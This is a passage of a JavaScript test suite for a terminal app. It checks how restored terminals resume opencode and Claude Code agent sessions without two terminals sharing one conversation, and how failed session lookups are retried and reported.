        const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha'), ocRecord(2, 'Beta')]));
        const reason = 'opencode session list failed: Error: database is locked';
        const refused = await typedInto(
          async () => {
            assert.equal(await T.getState().resumeAgent(tabs[0]), false);
          },
          { answer: () => Promise.reject(new Error(reason)) }
        );
        assert.deepEqual(refused.typed, {}, 'no `--continue` into a folder another opencode terminal shares');
        const t = tabById(tabs[0]);
        assert.equal(t.agentResumeOffered, true);
        assert.deepEqual(
          { kind: t.agentResumeNotice?.kind, reason: t.agentResumeNotice?.reason, shared: t.agentResumeNotice?.shared },
          { kind: 'unreadable', reason, shared: true },
          'the reason, word for word, for the banner'
        );
        assert.ok(warned.some((line) => line.includes(reason)), 'and on the console');

        // Chosen knowingly from the list: the folder's most recent, or a new one.
        const chosen = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(tabs[0], { latest: true }), true);
          assert.equal(await T.getState().resumeAgent(tabs[1], { fresh: true }), true);
        });
        assert.deepEqual(chosen.typed, { [tabs[0]]: ['opencode --continue\r'], [tabs[1]]: ['opencode\r'] });
        assert.equal(tabById(tabs[1]).agent.title, null, 'a new conversation is a new record');
      } finally {
        console.warn = warn;
      }
    });
  });

  test('OR-26: one terminal alone with an unreadable list still continues the most recent, as before \u{2014} and says why', async () => {
    await isolated(async () => {
      const warn = console.warn;
      const warned = [];
      console.warn = (...args) => warned.push(args.join(' '));
      try {
        const [only] = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha')]));
        const { typed } = await typedInto(
          async () => {
            assert.equal(await T.getState().resumeAgent(only), true);
          },
          { answer: () => Promise.reject(new Error('opencode was not found on PATH')) }
        );
        assert.deepEqual(typed, { [only]: ['opencode --continue\r'] });
        assert.ok(
          warned.some((line) => line.includes('opencode was not found on PATH') && line.includes('most recent')),
          `the terminal (here the console) is told why: ${JSON.stringify(warned)}`
        );
      } finally {
        console.warn = warn;
      }
    });
  });

  test('OR-27: two records left with one id by an earlier build \u{2014} the first keeps it, the other finds its own by title', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(
        workspaceOf([ocRecord(1, 'Hello', SES_NEW), ocRecord(2, 'Hello', SES_NEW)])
      );
      conversations([
        { id: SES_OLD, title: 'Hello', updated: 100, created: 1, directory: '/workspace' },
        { id: SES_NEW, title: 'Hello', updated: 200, created: 2, directory: '/workspace' },
      ]);
      const { typed, lookups } = await typedInto(async () => {
        for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), true);
      });
      assert.deepEqual(typed, { [tabs[0]]: [`opencode -s ${SES_NEW}\r`], [tabs[1]]: [`opencode -s ${SES_OLD}\r`] });
      assert.equal(lookups.length, 1, 'only the second had to look');
    });
  });

  test('OR-41: two records left with one id \u{2014} the first resumes it, opencode renames it there, and the second still does not type it', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Hello', SES_NEW), ocRecord(2, 'Hello', SES_NEW)]));
      conversations([{ id: SES_NEW, title: 'Hello', updated: 200, created: 2, directory: '/workspace' }]);
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          const first = await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[0]), true);
            await started(tabById(tabs[0]));
            // Renamed where the list does not show it yet: the record lets
            // go of the id while it looks for the new title.
            await titled(tabById(tabs[0]), 'OC | Hello, renamed');
            await settle();
          });
          assert.deepEqual(first.typed, { [tabs[0]]: [`opencode -s ${SES_NEW}\r`] });
          assert.equal(tabById(tabs[0]).agent.sessionId, null, 'setup: the record let go of the id');
          const second = await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[1]), false);
          });
          assert.deepEqual(second.typed, {}, 'the conversation open in the first terminal, typed into the second');
          assert.equal(tabById(tabs[1]).agentResumeNotice?.kind, 'unsure');
        })
      );
    });
  });

  test('OR-28: Resume looks once \u{2014} a second press while it looks, or a dismiss, types nothing', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha'), ocRecord(2, 'Beta')]));
      conversations([
        { id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Beta', updated: 20, created: 2, directory: '/workspace' },
      ]);
      const slow = async (_nth, _args, asTheMockWould) => {
        await sleep(60);
        return asTheMockWould();
      };
      const { typed, lookups } = await typedInto(
        async () => {
          const first = T.getState().resumeAgent(tabs[0]);
          await sleep(10);
          assert.equal(tabById(tabs[0]).agentResumeLooking, true, 'the banner says it is looking');
          assert.equal(await T.getState().resumeAgent(tabs[0]), false, 'a second press');
          const other = T.getState().resumeAgent(tabs[1]);
          await sleep(10);
          T.getState().dismissAgentResume(tabs[1]);
          assert.equal(await first, true);
          assert.equal(await other, false, 'dismissed while it looked');
        },
        { answer: slow }
      );
      assert.equal(lookups.length, 2);
      assert.deepEqual(typed, { [tabs[0]]: [`opencode -s ${SES_A}\r`] });
      assert.equal(tabById(tabs[1]).agent, null);
      assert.equal(tabById(tabs[0]).agentResumeLooking, false);
    });
  });

  test('OR-33: a conversation resumed here stays this terminal\'s while its record has lost the id \u{2014} and is free once the terminal closes', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha', SES_A), ocRecord(2, 'Alpha')]));
      conversations([{ id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' }]);
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          const first = await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[0]), true);
            await started(tabById(tabs[0]));
            // opencode shows a title the list does not have: the record lets
            // go of the id until a lookup finds it again — which this one
            // cannot.
            await titled(tabById(tabs[0]), 'OC | Alpha, renamed');
            await settle();
          });
          assert.deepEqual(first.typed, { [tabs[0]]: [`opencode -s ${SES_A}\r`] });
          assert.equal(tabById(tabs[0]).agent.sessionId, null, 'setup: the record lost its id');

          const second = await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[1]), false);
          });
          assert.deepEqual(second.typed, {}, 'the conversation open in the first terminal, typed into the second');
          assert.equal(tabById(tabs[1]).agentResumeNotice?.kind, 'unsure');

          await T.getState().closeTab(tabs[0]);
          const third = await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[1]), true);
          });
          assert.deepEqual(third.typed, { [tabs[1]]: [`opencode -s ${SES_A}\r`] }, 'closed, it is no one\u{2019}s');
        })
      );
    });
  });

  test('OR-35: on Windows the folder is looked up as Windows spells it \u{2014} Git Bash\'s /c/x as C:\\x \u{2014} and one on another machine by its spelling', async () => {
    const os = useSystemStore.getState().os;
    try {
      await isolated(async () => {
        useSystemStore.setState({ os: 'windows' });
        const [only] = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha')]));
        T.setState((s) => ({
          tabs: s.tabs.map((t) =>
            t.id === only ? { ...t, cwd: '/c/Users/me/proj', shell: 'C:\\Program Files\\Git\\bin\\bash.exe' } : t
          ),
        }));
        conversations([{ id: SES_A, title: 'Alpha', updated: 1, created: 1, directory: 'C:\\Users\\me\\proj' }]);
        const msys = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(only), true);
        });
        assert.deepEqual(msys.lookups, [{ kind: 'opencode', cwd: 'C:\\Users\\me\\proj' }]);
        assert.deepEqual(msys.typed, { [only]: [`opencode -s ${SES_A}\r`] });

        // The backend compares it by spelling and runs nothing there
        // (`run_dir`); its Choose\u{2026} list works too.
        const share = '\\\\fileserver\\share\\proj';
        const [remote] = await restoredTerminals(workspaceOf([ocRecord(1, 'Beta'), ocRecord(2, 'Gamma')], share));
        conversations([
          { id: SES_B, title: 'Beta', updated: 2, created: 2, directory: share },
          { id: SES_C, title: 'Gamma', updated: 3, created: 3, directory: share },
        ]);
        const network = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(remote), true);
        });
        assert.deepEqual(network.lookups, [{ kind: 'opencode', cwd: share }]);
        assert.deepEqual(network.typed, { [remote]: [`opencode -s ${SES_B}\r`] });
        const listed = await T.getState().listAgentSessions(T.getState().tabs[1].id);
        assert.deepEqual(listed.map((s) => s.id), [SES_C, SES_B]);
      });
    } finally {
      useSystemStore.setState({ os });
    }
  });

  test('OR-29: the list marks a conversation another terminal has \u{2014} in its record, or resumed into and since renamed \u{2014} and a pick of it is refused', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha', SES_A), ocRecord(2, 'Beta', SES_B), ocRecord(3)]));
      conversations([
        { id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Beta', updated: 20, created: 2, directory: '/workspace' },
        { id: SES_C, title: 'Gamma', updated: 30, created: 3, directory: '/workspace' },
      ]);
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          await typedInto(async () => {
            assert.equal(await T.getState().resumeAgent(tabs[0]), true);
            await started(tabById(tabs[0]));
            // Renamed where the list does not show it yet: the record lets
            // go of the id until a lookup finds it again.
            await titled(tabById(tabs[0]), 'OC | Alpha, renamed');
            await settle();
          });
        })
      );
      assert.equal(tabById(tabs[0]).agent.sessionId, null, 'setup: the record lost its id');
      const listed = await T.getState().listAgentSessions(tabs[2]);
      assert.deepEqual(
        listed.map((s) => [s.id, s.heldBy]),
        [[SES_C, null], [SES_B, 'Terminal 2'], [SES_A, 'Terminal 1']]
      );
      const refused = await typedInto(async () => {
        assert.equal(await T.getState().resumeAgent(tabs[2], { sessionId: SES_A, title: 'Alpha' }), false);
        assert.equal(await T.getState().resumeAgent(tabs[2], { sessionId: SES_B, title: 'Beta' }), false);
      });
      assert.deepEqual(refused.typed, {}, 'two terminals in one conversation');
      assert.deepEqual(
        { kind: tabById(tabs[2]).agentResumeNotice?.kind, heldBy: tabById(tabs[2]).agentResumeNotice?.heldBy },
        { kind: 'taken', heldBy: 'Terminal 2' }
      );
      assert.equal(tabById(tabs[2]).agentResumeOffered, true, 'the offer stays');
      const free = await typedInto(async () => {
        assert.equal(await T.getState().resumeAgent(tabs[2], { sessionId: SES_C, title: 'Gamma' }), true);
      });
      assert.deepEqual(free.typed, { [tabs[2]]: [`opencode -s ${SES_C}\r`] });
    });
  });

  test('OR-36: running, two terminals that knew their conversations keep them when opencode renames both alike', async () => {
    const a = await readyTerminal();
    const b = await readyTerminal();
    try {
      const firstA = 'New session - 2026-10-13T05:00:09.000Z';
      const firstB = 'New session - 2026-10-13T05:00:00.000Z';
      // b was messaged first, so its conversation is the older though its
      // agent started later.
      conversations([
        { id: SES_B, title: firstB, created: 10, updated: 10, directory: a.cwd },
        { id: SES_A, title: firstA, created: 20, updated: 20, directory: a.cwd },
      ]);
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          await withBackend({}, async () => {
            await typeLine(a.id, 'opencode');
            await started(a);
            await sleep(5);
            await typeLine(b.id, 'opencode');
            await started(b);
            await titled(b, `OC | ${firstB}`);
            await titled(a, `OC | ${firstA}`);
            await settle();
            assert.deepEqual([tabById(a.id).agent.sessionId, tabById(b.id).agent.sessionId], [SES_A, SES_B], 'setup');
            // The same prompt in both: the model names both conversations alike.
            conversations(mockBridge.agentSessions.map((s) => ({ ...s, title: 'Fix the login bug', updated: s.updated + 100 })));
            await titled(a, 'OC | Fix the login bug');
            await titled(b, 'OC | Fix the login bug');
            assert.equal(tabById(a.id).agent.sessionId, null, 'until it is looked up, the old id stands for no title');
            await settle();
          });
        })
      );
      assert.deepEqual([tabById(a.id).agent.sessionId, tabById(b.id).agent.sessionId], [SES_A, SES_B], 'dealt out again, swapped');
    } finally {
      await closeAll();
    }
  });

  test('OR-37: running, an id a terminal let go of on a new title is not taken by another meanwhile', async () => {
    const a = await readyTerminal();
    const b = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: 'Hello', created: 100, updated: 900, directory: a.cwd },
        { id: SES_B, title: 'Hello', created: 200, updated: 300, directory: a.cwd },
      ]);
      await quickly(() =>
        withHook('__setAgentResolveRetryMs', [], async () => {
          await withBackend({}, async () => {
            await typeLine(a.id, 'opencode');
            await started(a);
            await titled(a, 'OC | Hello');
            await settle();
            assert.equal(tabById(a.id).agent.sessionId, SES_A, 'setup');
            // Renamed; the list has not caught up, so a cannot find it yet.
            await titled(a, 'OC | Hello world');
            await settle();
            assert.equal(tabById(a.id).agent.sessionId, null, 'setup: a let go of its id');
            await typeLine(b.id, 'opencode');
            await started(b);
            await titled(b, 'OC | Hello');
            await settle();
          });
        })
      );
      assert.equal(tabById(b.id).agent.sessionId, SES_B, 'took the conversation the first terminal is in');
    } finally {
      await closeAll();
    }
  });

  test('OR-38: no `--continue` while another opencode terminal is in the run \u{2014} a parent and its subfolder included \u{2014} and only one chosen knowingly', async () => {
    // `--continue` is the most recent in the folder OR BELOW: from a
    // repository's root it is the subfolder terminal's conversation too.
    await isolated(async () => {
      const seed = workspaceOf([ocRecord(1, 'Root work'), ocRecord(2, 'Sub work')]);
      seed.tabs[1].cwd = '/workspace/sub';
      for (const failing of [false, true]) {
        const tabs = await restoredTerminals(seed);
        conversations([]);
        const { typed } = await typedInto(
          async () => {
            for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), false);
          },
          failing ? { answer: () => Promise.reject(new Error('opencode session list: gave up after 20 s')) } : {}
        );
        assert.deepEqual(typed, {}, failing ? 'unreadable list' : 'empty list');
        assert.deepEqual(
          tabs.map((id) => tabById(id).agentResumeNotice?.kind),
          failing ? ['unreadable', 'unreadable'] : ['unsure', 'unsure']
        );
        const chosen = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(tabs[0], { latest: true }), true);
          assert.equal(await T.getState().resumeAgent(tabs[1], { latest: true }), false, 'the same most recent, twice');
        });
        assert.deepEqual(chosen.typed, { [tabs[0]]: ['opencode --continue\r'] });
        assert.deepEqual(
          { kind: tabById(tabs[1]).agentResumeNotice?.kind, latest: tabById(tabs[1]).agentResumeNotice?.latest },
          { kind: 'taken', latest: true }
        );
      }
    });
  });

  test('OR-39: one terminal alone whose title fits nothing listed continues the most recent \u{2014} not a guessed old id \u{2014} and says why', async () => {
    await isolated(async () => {
      const warn = console.warn;
      const warned = [];
      console.warn = (...args) => warned.push(args.join(' '));
      try {
        const [only] = await restoredTerminals(workspaceOf([ocRecord(1, 'Made a repository since')]));
        conversations([{ id: SES_OLD, title: 'Something from before', updated: 1, created: 1, directory: '/workspace' }]);
        const { typed } = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(only), true);
        });
        assert.deepEqual(typed, { [only]: ['opencode --continue\r'] });
        assert.ok(
          warned.some((line) => line.includes('\u{201C}Made a repository since\u{201D}') && line.includes('or below')),
          `not said why: ${JSON.stringify(warned)}`
        );
      } finally {
        console.warn = warn;
      }
    });
  });

  test('OR-40: a terminal resumed this run still counts once its opencode has exited \u{2014} the last one left does not `--continue` into its conversation', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha', SES_A), ocRecord(2)]));
      conversations([{ id: SES_A, title: 'Alpha', updated: 10, created: 1, directory: '/workspace' }]);
      const first = await typedInto(async () => {
        assert.equal(await T.getState().resumeAgent(tabs[0]), true);
        await started(tabById(tabs[0]));
        await prompt(tabById(tabs[0])); // opencode exits: its record ends
      });
      assert.deepEqual(first.typed, { [tabs[0]]: [`opencode -s ${SES_A}\r`] });
      assert.equal(tabById(tabs[0]).agent, null, 'setup: the first terminal runs no opencode now');
      const second = await typedInto(async () => {
        assert.equal(await T.getState().resumeAgent(tabs[1]), false);
      });
      assert.deepEqual(second.typed, {}, 'the most recent is the conversation the first terminal had');
      assert.equal(tabById(tabs[1]).agentResumeNotice?.kind, 'unsure');
    });
  });

  test('OR-42: terminals whose folders `--continue` cannot reach from one another \u{2014} unrelated projects, sibling folders \u{2014} each continue their own most recent', async () => {
    await isolated(async () => {
      const seed = workspaceOf([ocRecord(1, 'Alpha'), ocRecord(2, 'Beta'), ocRecord(3, 'Gamma'), ocRecord(4, 'Delta')]);
      ['/projA', '/projB', '/repo/web', '/repo/api'].forEach((cwd, i) => {
        seed.tabs[i].cwd = cwd;
      });
      const tabs = await restoredTerminals(seed);
      const unreadable = { answer: () => Promise.reject(new Error('opencode was not found on PATH (OR-42)')) };
      const warn = console.warn;
      console.warn = () => {};
      try {
        const { typed } = await typedInto(async () => {
          for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), true, id);
        }, unreadable);
        assert.deepEqual(typed, Object.fromEntries(tabs.map((id) => [id, ['opencode --continue\r']])));
      } finally {
        console.warn = warn;
      }

      // A parent and its child do reach each other, in whatever case and
      // with whatever separators two shells spell them.
      const nested = workspaceOf([ocRecord(1, 'Root'), ocRecord(2, 'Sub')]);
      nested.tabs[0].cwd = '/Repo/';
      nested.tabs[1].cwd = '\\repo\\web';
      const pair = await restoredTerminals(nested);
      assert.deepEqual(pair.map((id) => T.getState().resumeFallbackFor(id)), ['ask', 'ask']);
      const sibling = workspaceOf([ocRecord(1, 'A'), ocRecord(2, 'B')]);
      sibling.tabs[0].cwd = '/repo/web';
      sibling.tabs[1].cwd = '/repo/website';
      const siblings = await restoredTerminals(sibling);
      assert.deepEqual(siblings.map((id) => T.getState().resumeFallbackFor(id)), ['continue', 'continue'], '/repo/web is not inside /repo/website');
    });
  });

  test('OR-43: once the other opencode terminal is closed, the one left continues the most recent again', async () => {
    await isolated(async () => {
      const tabs = await restoredTerminals(workspaceOf([ocRecord(1, 'Alpha', SES_A), ocRecord(2, 'Beta')]));
      conversations([{ id: SES_A, title: 'Alpha', updated: 1, created: 1, directory: '/workspace' }]);
      await typedInto(async () => {
        assert.equal(await T.getState().resumeAgent(tabs[0]), true);
      });
      assert.equal(T.getState().resumeFallbackFor(tabs[1]), 'ask', 'setup: the first terminal is within reach');
      await T.getState().closeTab(tabs[0]);
      assert.equal(T.getState().resumeFallbackFor(tabs[1]), 'continue');
      const warn = console.warn;
      console.warn = () => {};
      try {
        const { typed } = await typedInto(
          async () => {
            assert.equal(await T.getState().resumeAgent(tabs[1]), true);
          },
          { answer: () => Promise.reject(new Error('database is locked')) }
        );
        assert.deepEqual(typed, { [tabs[1]]: ['opencode --continue\r'] });
      } finally {
        console.warn = warn;
      }
    });
  });

  test('OR-44: the most recent continued in one project does not stop another project\u{2019}s terminal choosing its own', async () => {
    await isolated(async () => {
      const seed = workspaceOf([ocRecord(1, 'Alpha'), ocRecord(2, 'Beta'), ocRecord(3, 'Gamma')]);
      ['/projA', '/projB', '/projB/sub'].forEach((cwd, i) => {
        seed.tabs[i].cwd = cwd;
      });
      const tabs = await restoredTerminals(seed);
      const unreadable = { answer: () => Promise.reject(new Error('opencode was not found on PATH (OR-44)')) };
      const warn = console.warn;
      console.warn = () => {};
      try {
        const auto = await typedInto(async () => {
          for (const id of tabs) await T.getState().resumeAgent(id);
        }, unreadable);
        assert.deepEqual(auto.typed, { [tabs[0]]: ['opencode --continue\r'] }, 'projB and its subfolder reach each other: they ask');
        const chosen = await typedInto(async () => {
          assert.equal(await T.getState().resumeAgent(tabs[1], { latest: true }), true, 'refused for what projA continued');
          assert.equal(await T.getState().resumeAgent(tabs[2], { latest: true }), false, 'its parent continued the same most recent');
        });
        assert.deepEqual(chosen.typed, { [tabs[1]]: ['opencode --continue\r'] });
        assert.equal(tabById(tabs[2]).agentResumeNotice?.heldBy, 'Terminal 2');
      } finally {
        console.warn = warn;
      }
    });
  });
});

describe('A lookup that fails while opencode runs is tried again', () => {
  /** Retries after 20, 40 and 60 ms rather than 15 s, a minute and five. */
  const soon = (fn) => withHook('__setAgentResolveRetryMs', [20, 40, 60], fn);

  test('OR-30: a lookup that failed is tried again, and the id is learned when it answers', async () => {
    const tab = await readyTerminal();
    const warn = console.warn;
    console.warn = () => {};
    try {
      conversations([{ id: SES_A, title: 'Alpha', updated: 1, created: 1, directory: tab.cwd }]);
      await quickly(() =>
        soon(async () => {
          const { lookups } = await typedInto(
            async () => {
              await typeLine(tab.id, 'opencode');
              await started(tab);
              await titled(tab, 'OC | Alpha');
              await sleep(12); // looked up at 5 ms; the retry is due at 25
              assert.equal(tabById(tab.id).agent.sessionId, null, 'setup: the first lookup failed');
              await sleep(80);
            },
            {
              answer: (nth, _args, asTheMockWould) =>
                nth === 0 ? Promise.reject(new Error('opencode session list: gave up after 20 s')) : asTheMockWould(),
            }
          );
          assert.equal(lookups.length, 2, 'once more, and no more once it answered');
        })
      );
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
    } finally {
      console.warn = warn;
      await closeAll();
    }
  });

  test('OR-31: retries are bounded, found-nothing counts too, and they stop when the title changes or opencode exits', async () => {
    const tab = await readyTerminal();
    const warn = console.warn;
    const warned = [];
    console.warn = (...args) => warned.push(args.join(' '));
    try {
      await quickly(() =>
        soon(async () => {
          // A reason of its own: each is said once a run, and OR-11 said the plain one.
          const failing = { answer: () => Promise.reject(new Error('opencode was not found on PATH (OR-31)')) };
          const bounded = await typedInto(async () => {
            await typeLine(tab.id, 'opencode');
            await started(tab);
            await titled(tab, 'OC | Alpha');
            await sleep(250);
          }, failing);
          assert.equal(bounded.lookups.length, 4, 'the first and three more, then left until the title changes');
          assert.equal(warned.length, 1, 'said once, not at every retry');

          // Nothing listed for it: tried again as well.
          conversations([]);
          const empty = await typedInto(async () => {
            await titled(tab, 'OC | Beta');
            await sleep(250);
          });
          assert.equal(empty.lookups.length, 4);

          // A new title starts its own count; opencode exiting stops it.
          const stopped = await typedInto(async () => {
            await titled(tab, 'OC | Gamma');
            await sleep(12); // looked up at 5 ms and failed; the retry is due at 25
            await prompt(tab); // opencode exits
            await sleep(200);
          }, failing);
          assert.equal(stopped.lookups.length, 1, 'no retry after the agent exited');
          assert.equal(tabById(tab.id).agent, null);
        })
      );
    } finally {
      console.warn = warn;
      await closeAll();
    }
  });
});

describe('Claude Code resumes as it always did', () => {
  test('OR-32: an exact record and one with no id each type what they did, with no lookup, two in one folder or not', async () => {
    await isolated(async () => {
      const claude = startCommand('claude').agent;
      const tabs = await restoredTerminals(
        workspaceOf([claude, { kind: 'claude', sessionId: null, startedAt: 2, title: null }, { kind: 'claude', sessionId: null, startedAt: 3, title: null }])
      );
      const { typed, lookups } = await typedInto(async () => {
        for (const id of tabs) assert.equal(await T.getState().resumeAgent(id), true);
      });
      assert.deepEqual(typed, {
        [tabs[0]]: [`claude --resume ${claude.sessionId}\r`],
        [tabs[1]]: ['claude --continue\r'],
        [tabs[2]]: ['claude --continue\r'],
      });
      assert.deepEqual(lookups, []);
    });
  });
});

describe('A layout template saved while opencode runs continues it', () => {
  test('OR-16: an opencode typed by hand is saved as `opencode -c`, claude as `claude`', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode --model anthropic/claude-sonnet-5');
        await started(tab);
      });
      assert.equal(suggestStartupCommand(tabById(tab.id)), 'opencode -c');
      await prompt(tab);
      await withBackend({}, async () => {
        await typeLine(tab.id, `claude --resume ${UUID}`);
        await started(tab);
      });
      assert.equal(suggestStartupCommand(tabById(tab.id)), 'claude', 'never the id, which is in use');
    } finally {
      await closeAll();
    }
  });

  test('OR-17: teardown — nothing left looking anything up', async () => {
    await sleep(50);
    mockBridge.agentSessions = [];
    assert.equal(T.getState().tabs.some((t) => t.agent?.kind === 'opencode' && !t.agentResumeOffered), false);
  });
});
